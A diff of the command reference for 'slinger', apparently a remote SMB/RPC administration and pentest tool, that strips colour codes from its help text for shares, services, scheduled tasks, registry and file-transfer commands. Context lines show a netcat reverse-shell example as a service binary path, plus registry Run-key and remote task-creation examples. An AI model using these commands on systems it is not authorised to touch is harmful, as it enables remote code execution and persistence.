@@ -6,7 +6,7 @@
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger use[0m [[32m-h[0m] [32mshare[0m
+use [-h] share
 Connect to a specific share on the remote server
 ```
 
@@ -28,7 +28,10 @@ Example Usage: use <sharename> | use C$
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger ls[0m [[32m-h[0m] [[32m-s [33m{name,size,created,lastaccess,lastwrite}[0m] [[36m--sort-reverse[0m] [[32m-l[0m] [[32m-r [33mdepth[0m] [[32m-o [33mfilename[0m] [[36m--show[0m] [[36m--type [33m{f,d,a}[0m] [32m[path][0m
+ls [-h] [-s {name,size,created,lastaccess,lastwrite}]
+                  [--sort-reverse] [-l] [-r depth] [-o filename] [--show]
+                  [--type {f,d,a}]
+                  [path]
 List contents of a directory at a specified path. File paths with spaces must be entirely in quotes.
 ```
 
@@ -70,9 +73,13 @@ ls --type f -r 2        # Recursively list only files to depth 2
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger find[0m [[32m-h[0m] [[36m--path [33mPATH[0m] [[36m--type [33m{f,d,a}[0m] [[36m--size [33mSIZE[0m] [[36m--mtime [33mMTIME[0m] [[36m--ctime [33mCTIME[0m] [[36m--atime [33mATIME[0m] [[36m--regex[0m] [[36m--iname[0m] [[36m--maxdepth [33mMAXDEPTH[0m] [[36m--mindepth [33mMINDEPTH[0m] [[36m--limit [33mLIMIT[0m]
-                    [[36m--sort [33m{name,size,mtime,ctime,atime}[0m] [[36m--reverse[0m] [[36m--format [33m{table,list,paths,json}[0m] [[32m-o [33mOUTPUT[0m] [[36m--empty[0m] [[36m--hidden[0m] [[36m--progress[0m] [[36m--timeout [33mTIMEOUT[0m]
-                    [32mpattern[0m
+find [-h] [--path PATH] [--type {f,d,a}] [--size SIZE]
+                    [--mtime MTIME] [--ctime CTIME] [--atime ATIME] [--regex]
+                    [--iname] [--maxdepth MAXDEPTH] [--mindepth MINDEPTH]
+                    [--limit LIMIT] [--sort {name,size,mtime,ctime,atime}]
+                    [--reverse] [--format {table,list,paths,json}] [-o OUTPUT]
+                    [--empty] [--hidden] [--progress] [--timeout TIMEOUT]
+                    pattern
 Search for files and directories across the remote share with advanced filtering options.
 ```
 
@@ -143,7 +150,7 @@ Example Usage: find "*.txt" -path /Users -type f -size +1MB
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger shares[0m [[32m-h[0m] [[32m-l[0m]
+shares [-h] [-l]
 List all shares available on the remote server
 ```
 
@@ -160,7 +167,7 @@ Example Usage: shares
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger shares[0m [[32m-h[0m] [[32m-l[0m]
+shares [-h] [-l]
 List all shares available on the remote server
 ```
 
@@ -177,7 +184,8 @@ Example Usage: shares
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumpipes[0m [[32m-h[0m] [[36m--detailed[0m] [[36m--method [33m{smb,rpc,hybrid}[0m] [[36m--output [33mfilename[0m]
+enumpipes [-h] [--detailed] [--method {smb,rpc,hybrid}]
+                         [--output filename]
 Enumerate named pipes on the remote server via IPC$ share and RPC endpoints. Preserves current share connection by default.
 ```
 
@@ -204,7 +212,7 @@ Example Usage: enumpipes --detailed --output pipes.txt
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger cat[0m [[32m-h[0m] [32mremote_path[0m
+cat [-h] remote_path
 Display the contents of a specified file on the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -226,7 +234,7 @@ Example Usage: cat /path/to/file
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger cd[0m [[32m-h[0m] [32m[path][0m
+cd [-h] [path]
 Change to a different directory on the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -249,7 +257,7 @@ Example Usage: cd /path/to/directory
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger pwd[0m [[32m-h[0m]
+pwd [-h]
 Print the current working directory on the remote server
 ```
 
@@ -266,7 +274,7 @@ Example Usage: pwd
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger exit[0m [[32m-h[0m]
+exit [-h]
 Exit the application
 ```
 
@@ -283,7 +291,7 @@ Example Usage: exit
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger exit[0m [[32m-h[0m]
+exit [-h]
 Exit the application
 ```
 
@@ -300,7 +308,7 @@ Example Usage: exit
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger exit[0m [[32m-h[0m]
+exit [-h]
 Exit the application
 ```
 
@@ -317,7 +325,7 @@ Example Usage: exit
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger exit[0m [[32m-h[0m]
+exit [-h]
 Exit the application
 ```
 
@@ -334,7 +342,7 @@ Example Usage: exit
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger clear[0m [[32m-h[0m]
+clear [-h]
 Clear the screen
 ```
 
@@ -351,7 +359,7 @@ Example Usage: clear
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger help[0m [[32m-h[0m] [[36m--verbose[0m] [32m[cmd][0m
+help [-h] [--verbose] [cmd]
 Display help information for the application
 ```
 
@@ -373,7 +381,7 @@ Example Usage: help
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger reconnect[0m [[32m-h[0m]
+reconnect [-h]
 Reconnect to the server to fix broken pipe or connection errors
 ```
 
@@ -390,7 +398,7 @@ Use this command when you encounter '[Errno 32] Broken pipe' errors
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger who[0m [[32m-h[0m]
+who [-h]
 List the current sessions connected to the target host
 ```
 
@@ -407,7 +415,7 @@ Example Usage: who
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumdisk[0m [[32m-h[0m]
+enumdisk [-h]
 Enumerate server disk information
 ```
 
@@ -424,7 +432,7 @@ Example Usage: enumdisk
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumlogons[0m [[32m-h[0m]
+enumlogons [-h]
 Enumerate users currently logged on the server
 ```
 
@@ -441,7 +449,7 @@ Example Usage: enumlogons
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enuminfo[0m [[32m-h[0m]
+enuminfo [-h]
 Enumerate detailed information about the remote host
 ```
 
@@ -458,7 +466,7 @@ Example Usage: enuminfo
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumsys[0m [[32m-h[0m]
+enumsys [-h]
 Enumerate system information of the remote host
 ```
 
@@ -475,7 +483,7 @@ Example Usage: enumsys
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumtransport[0m [[32m-h[0m]
+enumtransport [-h]
 Enumerate transport information of the remote host
 ```
 
@@ -492,7 +500,7 @@ Example Usage: enumtransport
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumservices[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
+enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
 ```
 
@@ -514,7 +522,7 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumservices[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
+enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
 ```
 
@@ -536,7 +544,7 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumservices[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
+enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
 ```
 
@@ -558,7 +566,7 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumservices[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
+enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
 ```
 
@@ -580,7 +588,7 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger serviceshow[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+serviceshow [-h] (-i SERVICEID | service_name)
 Show details of a specific service on the remote server
 ```
 
@@ -605,7 +613,7 @@ Example Usage: serviceshow -i 123
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger serviceshow[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+serviceshow [-h] (-i SERVICEID | service_name)
 Show details of a specific service on the remote server
 ```
 
@@ -630,7 +638,7 @@ Example Usage: serviceshow -i 123
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger serviceshow[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+serviceshow [-h] (-i SERVICEID | service_name)
 Show details of a specific service on the remote server
 ```
 
@@ -655,7 +663,7 @@ Example Usage: serviceshow -i 123
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicestart[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicestart [-h] (-i SERVICEID | service_name)
 Start a specified service on the remote server
 ```
 
@@ -680,7 +688,7 @@ Example Usage: servicestart -i 123  OR svcstart Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicestart[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicestart [-h] (-i SERVICEID | service_name)
 Start a specified service on the remote server
 ```
 
@@ -705,7 +713,7 @@ Example Usage: servicestart -i 123  OR svcstart Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicestart[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicestart [-h] (-i SERVICEID | service_name)
 Start a specified service on the remote server
 ```
 
@@ -730,7 +738,7 @@ Example Usage: servicestart -i 123  OR svcstart Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicestop[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicestop [-h] (-i SERVICEID | service_name)
 Stop a specified service on the remote server
 ```
 
@@ -755,7 +763,7 @@ Example Usage: servicestop -i 123  OR svcstop Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicestop[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicestop [-h] (-i SERVICEID | service_name)
 Stop a specified service on the remote server
 ```
 
@@ -780,7 +788,7 @@ Example Usage: servicestop -i 123  OR svcstop Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger serviceenable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
 ```
 
@@ -805,7 +813,7 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger serviceenable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
 ```
 
@@ -830,7 +838,7 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger serviceenable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
 ```
 
@@ -855,7 +863,7 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger serviceenable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
 ```
 
@@ -880,7 +888,7 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicedisable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
 ```
 
@@ -905,7 +913,7 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicedisable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
 ```
 
@@ -930,7 +938,7 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicedisable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
 ```
 
@@ -955,7 +963,7 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicedisable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
 ```
 
@@ -980,7 +988,7 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicedel[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicedel [-h] (-i SERVICEID | service_name)
 Delete a specified service on the remote server
 ```
 
@@ -1005,7 +1013,7 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicedel[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicedel [-h] (-i SERVICEID | service_name)
 Delete a specified service on the remote server
 ```
 
@@ -1030,7 +1038,7 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger servicedel[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
+servicedel [-h] (-i SERVICEID | service_name)
 Delete a specified service on the remote server
 ```
 
@@ -1055,7 +1063,8 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger serviceadd[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-b [33mBINARY_PATH[0m [32m-d [33mDISPLAY_NAME[0m [32m-s [33m{auto,demand,system}[0m
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+                          -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1088,7 +1097,8 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger serviceadd[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-b [33mBINARY_PATH[0m [32m-d [33mDISPLAY_NAME[0m [32m-s [33m{auto,demand,system}[0m
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+                          -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1121,7 +1131,8 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger serviceadd[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-b [33mBINARY_PATH[0m [32m-d [33mDISPLAY_NAME[0m [32m-s [33m{auto,demand,system}[0m
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+                          -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1154,7 +1165,8 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger serviceadd[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-b [33mBINARY_PATH[0m [32m-d [33mDISPLAY_NAME[0m [32m-s [33m{auto,demand,system}[0m
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+                          -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1187,7 +1199,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumtasks[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
+enumtasks [-h] [-n] [--filter FILTER]
 Enumerate scheduled tasks on the remote server
 ```
 
@@ -1209,7 +1221,7 @@ Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Wi
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumtasks[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
+enumtasks [-h] [-n] [--filter FILTER]
 Enumerate scheduled tasks on the remote server
 ```
 
@@ -1231,7 +1243,7 @@ Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Wi
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger enumtasks[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
+enumtasks [-h] [-n] [--filter FILTER]
 Enumerate scheduled tasks on the remote server
 ```
 
@@ -1253,7 +1265,7 @@ Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Wi
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger taskshow[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
+taskshow [-h] (-i TASK_ID | task_path)
 Show details of a specific task on the remote server
 ```
 
@@ -1278,7 +1290,7 @@ Example Usage: tasksshow -i 123
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger taskshow[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
+taskshow [-h] (-i TASK_ID | task_path)
 Show details of a specific task on the remote server
 ```
 
@@ -1303,7 +1315,7 @@ Example Usage: tasksshow -i 123
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger taskshow[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
+taskshow [-h] (-i TASK_ID | task_path)
 Show details of a specific task on the remote server
 ```
 
@@ -1328,7 +1340,8 @@ Example Usage: tasksshow -i 123
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger taskcreate[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-p [33mPROGRAM[0m [[32m-a [33mARGUMENTS[0m] [[32m-f [33mFOLDER[0m] [[32m-i [33mINTERVAL[0m] [[32m-d [33mDATE[0m]
+taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
+                          [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
 ```
 
@@ -1366,7 +1379,8 @@ Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' 
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger taskcreate[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-p [33mPROGRAM[0m [[32m-a [33mARGUMENTS[0m] [[32m-f [33mFOLDER[0m] [[32m-i [33mINTERVAL[0m] [[32m-d [33mDATE[0m]
+taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
+                          [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
 ```
 
@@ -1404,7 +1418,7 @@ Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' 
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger taskrun[0m [[32m-h[0m] [32mtask_path[0m
+taskrun [-h] task_path
 Run a specified task on the remote server
 ```
 
@@ -1426,7 +1440,7 @@ Example Usage: taskrun \\Windows\\newtask
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger taskrun[0m [[32m-h[0m] [32mtask_path[0m
+taskrun [-h] task_path
 Run a specified task on the remote server
 ```
 
@@ -1448,7 +1462,7 @@ Example Usage: taskrun \\Windows\\newtask
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger taskdelete[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
+taskdelete [-h] (-i TASK_ID | task_path)
 Delete a specified task on the remote server
 ```
 
@@ -1473,7 +1487,7 @@ Example Usage: taskdelete -i 123
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger taskdelete[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
+taskdelete [-h] (-i TASK_ID | task_path)
 Delete a specified task on the remote server
 ```
 
@@ -1498,7 +1512,7 @@ Example Usage: taskdelete -i 123
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger taskdelete[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
+taskdelete [-h] (-i TASK_ID | task_path)
 Delete a specified task on the remote server
 ```
 
@@ -1523,7 +1537,7 @@ Example Usage: taskdelete -i 123
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger time[0m [[32m-h[0m]
+time [-h]
 Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
 ```
 
@@ -1540,7 +1554,7 @@ Example Usage: time
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger time[0m [[32m-h[0m]
+time [-h]
 Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
 ```
 
@@ -1557,7 +1571,7 @@ Example Usage: time
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger time[0m [[32m-h[0m]
+time [-h]
 Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
 ```
 
@@ -1574,7 +1588,7 @@ Example Usage: time
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger upload[0m [[32m-h[0m] [32mlocal_path[0m [32m[remote_path][0m
+upload [-h] local_path [remote_path]
 Upload a file to the remote server
 ```
 
@@ -1599,7 +1613,7 @@ Example Usage: upload /local/path /remote/path
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger upload[0m [[32m-h[0m] [32mlocal_path[0m [32m[remote_path][0m
+upload [-h] local_path [remote_path]
 Upload a file to the remote server
 ```
 
@@ -1624,7 +1638,8 @@ Example Usage: upload /local/path /remote/path
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger download[0m [[32m-h[0m] [[36m--resume[0m] [[36m--restart[0m] [[36m--chunk-size [33mCHUNK_SIZE[0m] [32mremote_path[0m [32m[local_path][0m
+download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
+                        remote_path [local_path]
 Download a file from the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -1653,7 +1668,8 @@ Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger download[0m [[32m-h[0m] [[36m--resume[0m] [[36m--restart[0m] [[36m--chunk-size [33mCHUNK_SIZE[0m] [32mremote_path[0m [32m[local_path][0m
+download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
+                        remote_path [local_path]
 Download a file from the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -1682,7 +1698,7 @@ Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger mget[0m [[32m-h[0m] [[32m-r[0m] [[32m-p [33mregex[0m] [[32m-d [33mD[0m] [32m[remote_path][0m [32m[local_path][0m
+mget [-h] [-r] [-p regex] [-d D] [remote_path] [local_path]
 Download all files from a specified directory and its subdirectories. File paths with spaces must be entirely in quotes.
 ```
 
@@ -1714,7 +1730,7 @@ Example Usage: mget /remote/path /local/path
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger mkdir[0m [[32m-h[0m] [32mpath[0m
+mkdir [-h] path
 Create a new directory on the remote server
 ```
 
@@ -1736,7 +1752,7 @@ Example Usage: mkdir /path/to/new/directory
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger rmdir[0m [[32m-h[0m] [32mremote_path[0m
+rmdir [-h] remote_path
 Remove a directory on the remote server
 ```
 
@@ -1758,7 +1774,7 @@ Example Usage: rmdir /path/to/remote/directory
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger rm[0m [[32m-h[0m] [[32m-n [33mFILE_LIST[0m] [32m[remote_path][0m
+rm [-h] [-n FILE_LIST] [remote_path]
 Delete one or more files on the remote server
 ```
 
@@ -1783,7 +1799,7 @@ Example Usage: rm file.txt, rm -n 'file1.txt file2.txt file3.txt'
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger #shell[0m [[32m-h[0m]
+#shell [-h]
 Enter local terminal mode for command execution
 ```
 
@@ -1800,7 +1816,7 @@ Example Usage: #shell
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger ![0m [[32m-h[0m] [32m...[0m
+! [-h] ...
 Run a specified local command
 ```
 
@@ -1822,7 +1838,7 @@ Example Usage: ! ls -l
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger info[0m [[32m-h[0m]
+info [-h]
 Display the status of the current session
 ```
 
@@ -1839,7 +1855,7 @@ Example Usage: info
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger history[0m [[32m-h[0m] [[32m-n [33mNUM[0m]
+history [-h] [-n NUM]
 Display recent command history from the slinger history file
 ```
 
@@ -1862,7 +1878,7 @@ Example Usage: history, history -n 20
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger reguse[0m [[32m-h[0m]
+reguse [-h]
 Connect to a remote registry on the remote server
 ```
 
@@ -1879,7 +1895,7 @@ Example Usage: reguse
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger reguse[0m [[32m-h[0m]
+reguse [-h]
 Connect to a remote registry on the remote server
 ```
 
@@ -1896,7 +1912,7 @@ Example Usage: reguse
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger regstop[0m [[32m-h[0m]
+regstop [-h]
 Disconnect from a remote registry on the remote server
 ```
 
@@ -1913,7 +1929,7 @@ Example Usage: regstop
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger regquery[0m [[32m-h[0m] [[32m-l[0m] [[32m-v[0m] [32mkey[0m
+regquery [-h] [-l] [-v] key
 Query a registry key on the remote server
 ```
 
@@ -1935,7 +1951,7 @@ Example Usage: regquery HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger regset[0m [[32m-h[0m] [32m-k [33mKEY[0m [32m-v [33mVALUE[0m [32m-d [33mDATA[0m [[32m-t [33mTYPE[0m]
+regset [-h] -k KEY -v VALUE -d DATA [-t TYPE]
 Set a registry value on the remote server
 ```
 
@@ -1967,7 +1983,7 @@ Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger regdel[0m [[32m-h[0m] [32m-k [33mKEY[0m [[32m-v [33mVALUE[0m]
+regdel [-h] -k KEY [-v VALUE]
 Delete a registry value on the remote server
 ```
 
@@ -1992,7 +2008,7 @@ Example Usage: regdel -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger regcreate[0m [[32m-h[0m] [32mkey[0m
+regcreate [-h] key
 Create a registry key on the remote server
 ```
 
@@ -2014,7 +2030,7 @@ Example Usage: regcreate -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger regcheck[0m [[32m-h[0m] [32mkey[0m
+regcheck [-h] key
 Check if a registry key exists on the remote server. This is really just an exposed helper function.
 ```
 
@@ -2036,7 +2052,7 @@ Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger portfwd[0m [[32m-h[0m] ([32m-d[0m | [32m-a[0m | [32m-l[0m | [32m-c[0m | [36m--load[0m) [32mlocal[0m [32mremote[0m
+portfwd [-h] (-d | -a | -l | -c | --load) local remote
 Forward a local port to a remote port on the remote server
 ```
 
@@ -2061,7 +2077,7 @@ Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger ifconfig[0m [[32m-h[0m]
+ifconfig [-h]
 Display network interfaces on the remote server
 ```
 
@@ -2078,7 +2094,7 @@ Example Usage: ifconfig
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger ifconfig[0m [[32m-h[0m]
+ifconfig [-h]
 Display network interfaces on the remote server
 ```
 
@@ -2095,7 +2111,7 @@ Example Usage: ifconfig
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger ifconfig[0m [[32m-h[0m]
+ifconfig [-h]
 Display network interfaces on the remote server
 ```
 
@@ -2112,7 +2128,7 @@ Example Usage: ifconfig
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger hostname[0m [[32m-h[0m]
+hostname [-h]
 Display the hostname of the remote server
 ```
 
@@ -2129,7 +2145,7 @@ Example Usage: hostname
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger procs[0m [[32m-h[0m] [[32m-v[0m] [[32m-t[0m]
+procs [-h] [-v] [-t]
 List running processes on the remote server
 ```
 
@@ -2146,7 +2162,7 @@ Example Usage: procs -t -v
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger procs[0m [[32m-h[0m] [[32m-v[0m] [[32m-t[0m]
+procs [-h] [-v] [-t]
